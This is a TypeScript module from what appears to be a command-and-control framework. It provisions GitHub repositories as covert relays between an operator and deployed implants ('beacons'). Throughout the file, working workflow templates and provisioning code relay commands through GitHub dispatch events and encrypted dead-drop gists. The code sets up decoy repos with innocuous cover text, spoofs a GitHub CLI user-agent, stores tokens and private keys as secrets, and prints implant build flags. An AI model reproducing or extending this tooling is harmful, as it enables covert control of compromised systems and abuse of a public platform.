/**
 * octoctl proxy
 *
 * Commands for managing OctoProxy — GitHub Actions-based sync relay repos.
 *
 *   octoctl proxy create --target-repo <owner/repo> --agent <id> --sync-token <pat>
 *     — Fully provision a target repo as an OctoProxy relay.
 *
 *   octoctl proxy templates --inner-kind <issues|notes>
 *     — Print the workflow templates (for manual setup).
 *
 *   octoctl proxy list
 *     — Show proxy repos configured via SVC_PROXY_REPOS env var.
 *
 *   octoctl proxy rotate <agentId> <newProxyRepos>
 *     — Print a dead-drop payload to update proxy repo list for an agent.
 */

import { mkdir, writeFile } from "node:fs/promises";
import { join } from "node:path";
import { Octokit } from "@octokit/rest";
import { encryptGitHubSecret } from "../lib/crypto.ts";
import { getBeacon } from "../lib/registry.ts";

// ── Embedded workflow templates ───────────────────────────────────────────────
// Templates are embedded here so octoctl works as a standalone binary without
// needing filesystem access to the repo root.

const TEMPLATE_HELPER = `name: CI Forward

on:
  issue_comment:
    types: [created]

jobs:
  forward:
    if: >
      github.event.issue.number == vars.FORWARD_ISSUE &&
      github.event.comment.user.login != 'github-actions[bot]'
    runs-on: ubuntu-latest
    steps:
      - name: Forward update
        env:
          SYNC_TOKEN: \${{ secrets.SYNC_TOKEN }}
          SYNC_REPO_OWNER: \${{ secrets.SYNC_REPO_OWNER }}
          SYNC_REPO_NAME: \${{ secrets.SYNC_REPO_NAME }}
          NODE_ID: \${{ secrets.NODE_ID }}
          COMMENT_BODY: \${{ github.event.comment.body }}
          COMMENT_ID:   \${{ github.event.comment.id }}
          ISSUE_NUMBER: \${{ github.event.issue.number }}
          LAST_UPDATE_TS: \${{ vars.LAST_UPDATE_TS }}
          TARGET_OWNER: \${{ github.repository_owner }}
          TARGET_REPO:  \${{ github.event.repository.name }}
        run: |
          set -euo pipefail
          curl -fsSL \\
            -X POST \\
            -H "Accept: application/vnd.github+json" \\
            -H "Authorization: Bearer \${SYNC_TOKEN}" \\
            "https://api.github.com/repos/\${SYNC_REPO_OWNER}/\${SYNC_REPO_NAME}/dispatches" \\
            -d "$(jq -n \\
              --arg node_id        "\${NODE_ID}" \\
              --arg comment_body   "\${COMMENT_BODY}" \\
              --argjson comment_id "\${COMMENT_ID}" \\
              --argjson issue_number "\${ISSUE_NUMBER}" \\
              --arg last_update_ts "\${LAST_UPDATE_TS}" \\
              --arg target_owner   "\${TARGET_OWNER}" \\
              --arg target_repo    "\${TARGET_REPO}" \\
              '{
                event_type: "infra-sync",
                client_payload: {
                  node_id:        $node_id,
                  comment_body:   $comment_body,
                  comment_id:     $comment_id,
                  issue_number:   $issue_number,
                  last_update_ts: $last_update_ts,
                  target_owner:   $target_owner,
                  target_repo:    $target_repo
                }
              }')"
`;

const TEMPLATE_SYNC_HELPER = `name: CI Sync

on:
  repository_dispatch:
    types: [infra-update]

jobs:
  sync:
    runs-on: ubuntu-latest
    steps:
      - name: Post update comment
        env:
          GH_TOKEN: \${{ secrets.GITHUB_TOKEN }}
          FORWARD_ISSUE: \${{ vars.FORWARD_ISSUE }}
          COMMENT_BODY: \${{ github.event.client_payload.comment_body }}
          UPDATE_TS:  \${{ github.event.client_payload.update_ts }}
          FORWARD_REPO: \${{ github.repository }}
        run: |
          set -euo pipefail
          gh issue comment "\${FORWARD_ISSUE}" \\
            --repo "\${FORWARD_REPO}" \\
            --body "\${COMMENT_BODY}"

      - name: Update last-sync cursor
        env:
          GH_TOKEN: \${{ secrets.GITHUB_TOKEN }}
          UPDATE_TS: \${{ github.event.client_payload.update_ts }}
          FORWARD_REPO: \${{ github.repository }}
        run: |
          set -euo pipefail
          gh variable set LAST_UPDATE_TS \\
            --repo "\${FORWARD_REPO}" \\
            --body "\${UPDATE_TS}"
`;

const TEMPLATE_PROCESS_CHECKIN = `name: CI Update

on:
  repository_dispatch:
    types: [infra-sync]

jobs:
  process:
    runs-on: ubuntu-latest
    steps:
      - name: Fetch and relay pending updates
        env:
          MAIN_TOKEN:        \${{ secrets.MAIN_TOKEN }}
          MAIN_REPO_OWNER:   \${{ secrets.MAIN_REPO_OWNER }}
          MAIN_REPO_NAME:    \${{ secrets.MAIN_REPO_NAME }}
          NODE_ISSUE_MAP:    \${{ secrets.NODE_ISSUE_MAP }}
          TARGET_TOKEN:      \${{ secrets.TARGET_TOKEN }}
          NODE_ID:           \${{ github.event.client_payload.node_id }}
          TARGET_OWNER:      \${{ github.event.client_payload.target_owner }}
          TARGET_REPO:       \${{ github.event.client_payload.target_repo }}
          LAST_UPDATE_TS:    \${{ github.event.client_payload.last_update_ts }}
        run: |
          set -euo pipefail
          # Resolve main issue number for this node
          ISSUE_NUMBER=$(echo "\${NODE_ISSUE_MAP}" | jq -r --arg id "\${NODE_ID}" '.[$id]')
          if [ "\${ISSUE_NUMBER}" = "null" ] || [ -z "\${ISSUE_NUMBER}" ]; then
            echo "Unknown node \${NODE_ID}, skipping"
            exit 0
          fi

          # Fetch comments from the main issue newer than last sync
          COMMENTS=$(curl -fsSL \\
            -H "Accept: application/vnd.github+json" \\
            -H "Authorization: Bearer \${MAIN_TOKEN}" \\
            "https://api.github.com/repos/\${MAIN_REPO_OWNER}/\${MAIN_REPO_NAME}/issues/\${ISSUE_NUMBER}/comments?per_page=100&sort=created&direction=asc" \\
            | jq --arg since "\${LAST_UPDATE_TS}" \\
                '[.[] | select(.created_at > $since)]')

          COUNT=$(echo "\${COMMENTS}" | jq length)
          if [ "\${COUNT}" = "0" ]; then
            echo "No new updates for \${NODE_ID}"
            exit 0
          fi

          # Forward each update comment to the target repo
          echo "\${COMMENTS}" | jq -c '.[]' | while read -r comment; do
            BODY=$(echo "\${comment}" | jq -r '.body')
            UPDATE_TS=$(echo "\${comment}" | jq -r '.created_at')
            curl -fsSL \\
              -X POST \\
              -H "Accept: application/vnd.github+json" \\
              -H "Authorization: Bearer \${TARGET_TOKEN}" \\
              "https://api.github.com/repos/\${TARGET_OWNER}/\${TARGET_REPO}/dispatches" \\
              -d "$(jq -n \\
                --arg comment_body "\${BODY}" \\
                --arg update_ts     "\${UPDATE_TS}" \\
                '{
                  event_type: "infra-update",
                  client_payload: {
                    comment_body: $comment_body,
                    update_ts:    $update_ts
                  }
                }')"
          done
`;

// ── Types ─────────────────────────────────────────────────────────────────────

export type InnerKind = "issues" | "notes";

/**
 * App authentication config for a proxy relay.
 * NOTE: Must be kept in sync with AppConfig in implant/src/types.ts.
 */
export interface ProxyAppConfig {
  appId:          string;
  installationId: string;
  privateKey:     string;
}

export interface ProxyConfig {
  owner:      string;
  repo:       string;
  token?:     string;
  innerKind:  InnerKind;
  appConfig?: ProxyAppConfig;
}

export interface ProxyCreateOptions {
  owner:     string;
  repo:      string;
  innerKind: InnerKind | string;
}

export interface ProxyRotateOptions {
  beaconId:     string;
  newProxyRepos: string;
}

// ── proxy create ──────────────────────────────────────────────────────────────

const VALID_INNER_KINDS: ReadonlySet<string> = new Set(["issues", "notes"]);

/**
 * Print the three OctoProxy workflow templates.
 *
 * @param opts   - Command options (owner, repo, innerKind)
 * @param print  - Output sink; defaults to console.log (injectable for tests)
 */
export async function proxyCreate(
  opts: ProxyCreateOptions,
  print: (line: string) => void = console.log
): Promise<void> {
  if (!VALID_INNER_KINDS.has(opts.innerKind)) {
    throw new Error(
      `--inner-kind must be 'issues' or 'notes', got '${opts.innerKind}'`
    );
  }

  const BOLD  = "\x1b[1m";
  const DIM   = "\x1b[2m";
  const CYAN  = "\x1b[36m";
  const RESET = "\x1b[0m";

  const sep = "─".repeat(72);

  print("");
  print(`${BOLD}OctoProxy workflow templates for ${opts.owner}/${opts.repo}${RESET}`);
  print(`${DIM}inner-kind: ${opts.innerKind}${RESET}`);
  print(`${DIM}Install all three files under .github/workflows/ in the proxy repo.${RESET}`);
  print("");

  const templates: Array<{ filename: string; content: string }> = [
    { filename: "helper.yml",          content: TEMPLATE_HELPER },
    { filename: "sync-helper.yml",     content: TEMPLATE_SYNC_HELPER },
    { filename: "process-checkin.yml", content: TEMPLATE_PROCESS_CHECKIN },
  ];

  for (const { filename, content } of templates) {
    print(`${CYAN}${sep}${RESET}`);
    print(`${BOLD}File: .github/workflows/${filename}${RESET}`);
    print(`${CYAN}${sep}${RESET}`);
    print(content);
  }

  print(`${CYAN}${sep}${RESET}`);
  print("");
  print(`${BOLD}Next steps for ${opts.owner}/${opts.repo}:${RESET}`);
  print(`  1. Copy the files above into .github/workflows/`);
  print(`  2. Set repo variables:`);
  print(`       FORWARD_ISSUE  — issue number the agent syncs into`);
  print(`  3. Set repo secrets:`);
  print(`       SYNC_TOKEN      — PAT for the sync repo (needs repo_dispatch)`);
  print(`       SYNC_REPO_OWNER — owner of the sync repo`);
  print(`       SYNC_REPO_NAME  — name of the sync repo`);
  print(`       NODE_ID         — agent UUID assigned to this proxy`);
  print("");
}

// ── proxy list ────────────────────────────────────────────────────────────────

/**
 * Print proxy repo configuration from SVC_PROXY_REPOS env var.
 *
 * @param print - Output sink; defaults to console.log (injectable for tests)
 */
export async function proxyList(
  print: (line: string) => void = console.log
): Promise<void> {
  const raw = process.env.SVC_PROXY_REPOS;

  const DIM   = "\x1b[2m";
  const BOLD  = "\x1b[1m";
  const RESET = "\x1b[0m";

  print("");
  print(`${BOLD}Proxy repos${RESET} — configured via SVC_PROXY_REPOS env var`);
  print("");

  if (!raw) {
    print(`  ${DIM}(none configured)${RESET}`);
    print(`  Set SVC_PROXY_REPOS to a JSON array of ProxyConfig objects:`);
    print(`  ${DIM}[{"owner":"acme","repo":"decoy","innerKind":"issues"}]${RESET}`);
    print("");
    return;
  }

  let configs: unknown;
  try {
    configs = JSON.parse(raw);
  } catch {
    print(`  Error: SVC_PROXY_REPOS is not valid JSON: ${raw}`);
    print("");
    return;
  }

  if (!Array.isArray(configs)) {
    print(`  Error: SVC_PROXY_REPOS must be a JSON array, got: ${typeof configs}`);
    print("");
    return;
  }

  if (configs.length === 0) {
    print(`  ${DIM}(none configured)${RESET}`);
    print("");
    return;
  }

  print(`  ${configs.length} proxy repo(s):`);
  print("");
  for (let i = 0; i < configs.length; i++) {
    const c = configs[i] as Record<string, unknown>;
    const owner     = typeof c.owner     === "string" ? c.owner     : "(unknown)";
    const repo      = typeof c.repo      === "string" ? c.repo      : "(unknown)";
    const innerKind = typeof c.innerKind === "string" ? c.innerKind : "(unknown)";
    print(`  ${i + 1}. ${owner}/${repo}  ${DIM}inner-kind: ${innerKind}${RESET}`);
  }
  print("");
}

// ── proxy rotate ──────────────────────────────────────────────────────────────

/**
 * Print instructions for rotating proxy repos for a beacon via a dead-drop.
 *
 * @param opts  - beaconId and newProxyRepos (JSON string)
 * @param print - Output sink; defaults to console.log (injectable for tests)
 */
export async function proxyRotate(
  opts: ProxyRotateOptions,
  print: (line: string) => void = console.log
): Promise<void> {
  // Validate JSON
  let parsed: unknown;
  try {
    parsed = JSON.parse(opts.newProxyRepos);
  } catch {
    throw new Error(
      `Invalid JSON for newProxyRepos: ${opts.newProxyRepos}`
    );
  }

  if (!Array.isArray(parsed)) {
    throw new Error(
      `newProxyRepos must be an array of ProxyConfig objects, got ${typeof parsed}`
    );
  }

  const BOLD  = "\x1b[1m";
  const DIM   = "\x1b[2m";
  const CYAN  = "\x1b[36m";
  const RESET = "\x1b[0m";

  print("");
  print(`${BOLD}Proxy rotation for agent ${opts.beaconId}${RESET}`);
  print(`${DIM}Post this dead-drop payload to the main issue to update proxy repos.${RESET}`);
  print("");
  print(`${CYAN}Dead-drop payload:${RESET}`);
  print(JSON.stringify({ type: "proxy-rotate", proxyRepos: parsed }, null, 2));
  print("");
  print(`${BOLD}Instructions:${RESET}`);
  print(`  1. Use ${DIM}octoctl drop create --beacon ${opts.beaconId} ...${RESET} to create`);
  print(`     an encrypted dead-drop gist containing the payload above.`);
  print(`  2. The agent will pick up the dead-drop on its next sync and`);
  print(`     switch to the new proxy repo list.`);
  print(`  3. Update SVC_PROXY_REPOS on the server to match.`);
  print("");
}

// ── proxy provision ───────────────────────────────────────────────────────────

export interface ProxyProvisionOptions {
  decoyOwner:      string;
  decoyRepo:       string;
  beaconId:        string;       // prefix match against registry
  ctrlToken:       string;       // value to store as SYNC_TOKEN secret
  ctrlOwner:       string;       // value to store as SYNC_REPO_OWNER secret
  ctrlRepo:        string;       // value to store as SYNC_REPO_NAME secret
  proxyToken?:     string;       // agent's PAT for SVC_PROXY_REPOS (default: OCTOC2_GITHUB_TOKEN)
  innerKind?:      InnerKind;    // default: 'issues'
  issueTitle?:     string;       // default: 'Dependency audit: review pinned versions'
  createRepo?:     boolean;      // create the GitHub repo first
  scaffold?:       boolean;      // push README.md + .gitignore scaffold commits
  dataDir?:        string;
  // GitHub App auth fields — if all three are provided, appConfig is baked into
  // the SVC_PROXY_REPOS entry so the beacon uses App tokens for this proxy repo.
  appId?:          string;
  installationId?: string;
  appPrivateKey?:  string;
  /** Injectable for tests — if not provided, creates from OCTOC2_GITHUB_TOKEN */
  _octokit?: unknown;
}

/**
 * Fully provision a target repo as an OctoProxy relay for an agent.
 */
export async function proxyProvision(
  opts: ProxyProvisionOptions,
  print: (line: string) => void = console.log,
): Promise<void> {
  const owner     = opts.decoyOwner;
  const repo      = opts.decoyRepo;
  const innerKind = opts.innerKind ?? "issues";
  const issueTitle = opts.issueTitle ?? "Dependency audit: review pinned versions";
  const dataDir   = opts.dataDir ?? process.env["OCTOC2_DATA_DIR"] ?? "./data";

  // 1. Load beacon from registry
  const beacon = await getBeacon(opts.beaconId, dataDir);
  if (!beacon) {
    throw new Error(`Beacon not found: no beacon matching '${opts.beaconId}'`);
  }

  // 2. Build Octokit
  const octokit = opts._octokit as Octokit ?? new Octokit({
    auth: process.env["OCTOC2_GITHUB_TOKEN"],
    headers: { "user-agent": "GitHub CLI/gh/2.48.0 (linux; amd64) go/1.23.0" },
  });

  // 3. Optionally create the repo
  if (opts.createRepo) {
    await octokit.rest.repos.createForAuthenticatedUser({
      name: repo,
      private: true,
      description: "Infrastructure utilities and helper scripts",
      auto_init: false,
    });
  }

  // 4. Optionally scaffold the repo
  if (opts.scaffold) {
    const readmeContent = `# ${repo}\n\nInternal infrastructure tooling.\n`;
    const gitignoreContent = `node_modules/\n.env\n*.log\ndist/\n`;

    await octokit.rest.repos.createOrUpdateFileContents({
      owner, repo,
      path: "README.md",
      message: "Initial scaffold",
      content: Buffer.from(readmeContent).toString("base64"),
    });

    await octokit.rest.repos.createOrUpdateFileContents({
      owner, repo,
      path: ".gitignore",
      message: "Add .gitignore",
      content: Buffer.from(gitignoreContent).toString("base64"),
    });
  }

  // 5. Create issue
  const issueResp = await octokit.rest.issues.create({
    owner, repo,
    title: issueTitle,
    body: "Track progress on quarterly dependency review.",
  });
  const proxyIssueNumber = issueResp.data.number;

  // 6. Push workflow files
  await octokit.rest.repos.createOrUpdateFileContents({
    owner, repo,
    path: ".github/workflows/helper.yml",
    message: "Add helper workflow",
    content: Buffer.from(TEMPLATE_HELPER).toString("base64"),
  });

  await octokit.rest.repos.createOrUpdateFileContents({
    owner, repo,
    path: ".github/workflows/sync-helper.yml",
    message: "Add sync-helper workflow",
    content: Buffer.from(TEMPLATE_SYNC_HELPER).toString("base64"),
  });

  // 7. Get repo public key for secret encryption
  const pkResp = await octokit.rest.actions.getRepoPublicKey({ owner, repo });
  const { key_id, key: repoPublicKey } = pkResp.data;

  // 8. Set 4 secrets
  const secretsToSet: Array<{ name: string; value: string }> = [
    { name: "SYNC_TOKEN",      value: opts.ctrlToken },
    { name: "SYNC_REPO_OWNER", value: opts.ctrlOwner },
    { name: "SYNC_REPO_NAME",  value: opts.ctrlRepo },
    { name: "NODE_ID",         value: beacon.beaconId },
  ];

  for (const { name, value } of secretsToSet) {
    const encryptedValue = await encryptGitHubSecret(value, repoPublicKey);
    await octokit.rest.actions.createOrUpdateRepoSecret({
      owner, repo,
      secret_name: name,
      encrypted_value: encryptedValue,
      key_id,
    });
  }

  // 9. Set 2 variables
  const variablesToSet: Array<{ name: string; value: string }> = [
    { name: "FORWARD_ISSUE",   value: String(proxyIssueNumber) },
    { name: "LAST_UPDATE_TS",  value: "1970-01-01T00:00:00Z" },
  ];

  for (const { name, value } of variablesToSet) {
    try {
      await octokit.rest.actions.createRepoVariable({ owner, repo, name, value });
    } catch (err: unknown) {
      const status = (err as { status?: number }).status;
      if (status === 422) {
        await octokit.rest.actions.updateRepoVariable({ owner, repo, name, value });
      } else {
        throw err;
      }
    }
  }

  // 10. Write proxy record
  const recordDir = join(dataDir, "proxies", beacon.beaconId);
  await mkdir(recordDir, { recursive: true });
  const recordPath = join(recordDir, `${owner}--${repo}.json`);
  const recordData: Record<string, unknown> = {
    decoyOwner: owner,
    decoyRepo: repo,
    innerKind,
    proxyIssueNumber,
    beaconId: beacon.beaconId,
    createdAt: new Date().toISOString(),
  };
  if (opts.appId && opts.installationId && opts.appPrivateKey) {
    recordData.appConfig = {
      appId:          opts.appId,
      installationId: opts.installationId,
      privateKey:     opts.appPrivateKey,
    };
  }
  await writeFile(recordPath, JSON.stringify(recordData, null, 2));

  // 11. Print sync repo instructions
  print(`Sync repo next steps:`);
  print(`  1. Commit process-checkin.yml to ${opts.ctrlOwner}/${opts.ctrlRepo}/.github/workflows/`);
  print(`     (run: octoctl proxy templates --inner-kind issues to get the file)`);
  print(`  2. Set these secrets on ${opts.ctrlOwner}/${opts.ctrlRepo}:`);
  print(`       MAIN_TOKEN       — PAT with issues:write on main repo`);
  print(`       MAIN_REPO_OWNER  — main repo owner`);
  print(`       MAIN_REPO_NAME   — main repo name`);
  print(`       TARGET_TOKEN     — PAT with actions:write on ${owner}/${repo}`);
  print(`  3. Update NODE_ISSUE_MAP secret on ${opts.ctrlOwner}/${opts.ctrlRepo}:`);
  print(`       Current value (add this entry): {"${beacon.beaconId}": ${beacon.issueNumber}}`);
  print("");

  // 12. Build SVC_PROXY_REPOS value
  const proxyRepoEntry: Record<string, unknown> = {
    owner,
    repo,
    innerKind,
  };
  if (opts.proxyToken) {
    proxyRepoEntry.token = opts.proxyToken;
  }
  if (opts.appId && opts.installationId && opts.appPrivateKey) {
    proxyRepoEntry.appConfig = {
      appId:          opts.appId,
      installationId: opts.installationId,
      privateKey:     opts.appPrivateKey,
    };
  }
  const proxyReposValue = JSON.stringify([proxyRepoEntry]);

  // 13. Print final output
  print(`✓ Proxy configured: ${owner}/${repo} (issue #${proxyIssueNumber})`);
  print("");
  print(`Add to your next beacon build:`);
  print("");
  print(`SVC_PROXY_REPOS='${proxyReposValue}'`);
  print("");
  print(`octoctl build-beacon --outfile ./implant \\`);
  print(`  --env "SVC_PROXY_REPOS=<value above>" \\`);
  print(`  --env "SVC_TENTACLE_PRIORITY=proxy,issues"`);
}
